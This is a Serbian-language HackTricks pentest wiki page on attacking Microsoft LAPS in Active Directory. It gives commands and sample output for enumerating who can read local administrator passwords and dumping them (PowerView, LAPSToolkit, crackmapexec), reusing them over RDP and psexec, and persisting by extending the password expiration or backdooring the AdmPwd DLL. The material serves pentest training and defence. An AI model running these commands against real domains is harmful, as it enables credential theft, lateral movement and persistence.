# LAPS

{{#include ../../banners/hacktricks-training.md}}

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

## Osnovne informacije

Local Administrator Password Solution (LAPS) je alat koji se koristi za upravljanje sistemom gde se **lozinke administratora**, koje su **jedinstvene, nasumične i često menjane**, primenjuju na računarima pridruženim domenu. Ove lozinke se sigurno čuvaju unutar Active Directory i dostupne su samo korisnicima kojima je odobrena dozvola putem Access Control Lists (ACLs). Bezbednost prenosa lozinki od klijenta do servera obezbeđena je korišćenjem **Kerberos verzije 5** i **Advanced Encryption Standard (AES)**.

U objektima računara domena, implementacija LAPS rezultira dodavanjem dva nova atributa: **`ms-mcs-AdmPwd`** i **`ms-mcs-AdmPwdExpirationTime`**. Ovi atributi čuvaju **lozinku administratora u običnom tekstu** i **njeno vreme isteka**, redom.

### Proverite da li je aktivirano
```bash
reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled

dir "C:\Program Files\LAPS\CSE"
# Check if that folder exists and contains AdmPwd.dll

# Find GPOs that have "LAPS" or some other descriptive term in the name
Get-DomainGPO | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name, GPCFileSysPath | fl

# Search computer objects where the ms-Mcs-AdmPwdExpirationTime property is not null (any Domain User can read this property)
Get-DomainObject -SearchBase "LDAP://DC=sub,DC=domain,DC=local" | ? { $_."ms-mcs-admpwdexpirationtime" -ne $null } | select DnsHostname
```
### LAPS Password Access

Možete **preuzeti sirovu LAPS politiku** sa `\\dc\SysVol\domain\Policies\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\Machine\Registry.pol` i zatim koristiti **`Parse-PolFile`** iz [**GPRegistryPolicyParser**](https://github.com/PowerShell/GPRegistryPolicyParser) paketa da konvertujete ovu datoteku u format koji je čitljiv za ljude.

Pored toga, **nativni LAPS PowerShell cmdleti** mogu se koristiti ako su instalirani na mašini kojoj imamo pristup:
```powershell
Get-Command *AdmPwd*

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Cmdlet          Find-AdmPwdExtendedRights                          5.0.0.0    AdmPwd.PS
Cmdlet          Get-AdmPwdPassword                                 5.0.0.0    AdmPwd.PS
Cmdlet          Reset-AdmPwdPassword                               5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdAuditing                                 5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdComputerSelfPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdReadPasswordPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdResetPasswordPermission                  5.0.0.0    AdmPwd.PS
Cmdlet          Update-AdmPwdADSchema                              5.0.0.0    AdmPwd.PS

# List who can read LAPS password of the given OU
Find-AdmPwdExtendedRights -Identity Workstations | fl

# Read the password
Get-AdmPwdPassword -ComputerName wkstn-2 | fl
```
**PowerView** se takođe može koristiti da se sazna **ko može da pročita lozinku i pročita je**:
```powershell
# Find the principals that have ReadPropery on ms-Mcs-AdmPwd
Get-AdmPwdPassword -ComputerName wkstn-2 | fl

# Read the password
Get-DomainObject -Identity wkstn-2 -Properties ms-Mcs-AdmPwd
```
### LAPSToolkit

The [LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) olakšava enumeraciju LAPS-a sa nekoliko funkcija.\
Jedna od njih je parsiranje **`ExtendedRights`** za **sve računare sa omogućenim LAPS-om.** Ovo će prikazati **grupe** specifično **delegirane za čitanje LAPS lozinki**, koje su često korisnici u zaštićenim grupama.\
**Nalog** koji je **pridružio računar** domenu dobija `All Extended Rights` nad tim hostom, a ovo pravo daje **nalogu** mogućnost da **čita lozinke**. Enumeracija može prikazati korisnički nalog koji može čitati LAPS lozinku na hostu. Ovo može pomoći da **ciljamo specifične AD korisnike** koji mogu čitati LAPS lozinke.
```powershell
# Get groups that can read passwords
Find-LAPSDelegatedGroups

OrgUnit                                           Delegated Groups
-------                                           ----------------
OU=Servers,DC=DOMAIN_NAME,DC=LOCAL                DOMAIN_NAME\Domain Admins
OU=Workstations,DC=DOMAIN_NAME,DC=LOCAL           DOMAIN_NAME\LAPS Admin

# Checks the rights on each computer with LAPS enabled for any groups
# with read access and users with "All Extended Rights"
Find-AdmPwdExtendedRights
ComputerName                Identity                    Reason
------------                --------                    ------
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\Domain Admins   Delegated
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\LAPS Admins     Delegated

# Get computers with LAPS enabled, expirations time and the password (if you have access)
Get-LAPSComputers
ComputerName                Password       Expiration
------------                --------       ----------
DC01.DOMAIN_NAME.LOCAL      j&gR+A(s976Rf% 12/10/2022 13:24:41
```
## **Dumping LAPS Passwords With Crackmapexec**

Ako nema pristupa powershell-u, možete zloupotrebiti ovu privilegiju daljinski putem LDAP-a koristeći
```
crackmapexec ldap 10.10.10.10 -u user -p password --kdcHost 10.10.10.10 -M laps
```
Ovo će izlistati sve lozinke koje korisnik može da pročita, omogućavajući vam da dobijete bolju poziciju sa drugim korisnikom.

## ** Korišćenje LAPS lozinke **
```
xfreerdp /v:192.168.1.1:3389  /u:Administrator
Password: 2Z@Ae)7!{9#Cq

python psexec.py Administrator@web.example.com
Password: 2Z@Ae)7!{9#Cq
```
## **LAPS Persistencija**

### **Datum isteka**

Jednom kada postanete administrator, moguće je **dobiti lozinke** i **sprečiti** mašinu da **ažurira** svoju **lozinku** tako što ćete **postaviti datum isteka u budućnost**.
```powershell
# Get expiration time
Get-DomainObject -Identity computer-21 -Properties ms-mcs-admpwdexpirationtime

# Change expiration time
## It's needed SYSTEM on the computer
Set-DomainObject -Identity wkstn-2 -Set @{"ms-mcs-admpwdexpirationtime"="232609935231523081"}
```
> [!WARNING]
> Lozinka će se i dalje resetovati ako **admin** koristi **`Reset-AdmPwdPassword`** cmdlet; ili ako je **Ne dozvoli vreme isteka lozinke duže od onog što zahteva politika** omogućeno u LAPS GPO.

### Backdoor

Izvorni kod za LAPS može se pronaći [ovde](https://github.com/GreyCorbel/admpwd), stoga je moguće staviti backdoor u kod (unutar `Get-AdmPwdPassword` metode u `Main/AdmPwd.PS/Main.cs`, na primer) koji će na neki način **izvući nove lozinke ili ih negde sačuvati**.

Zatim, samo kompajlirajte novi `AdmPwd.PS.dll` i otpremite ga na mašinu u `C:\Tools\admpwd\Main\AdmPwd.PS\bin\Debug\AdmPwd.PS.dll` (i promenite vreme modifikacije).

## References

- [https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/](https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/)

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

{{#include ../../banners/hacktricks-training.md}}
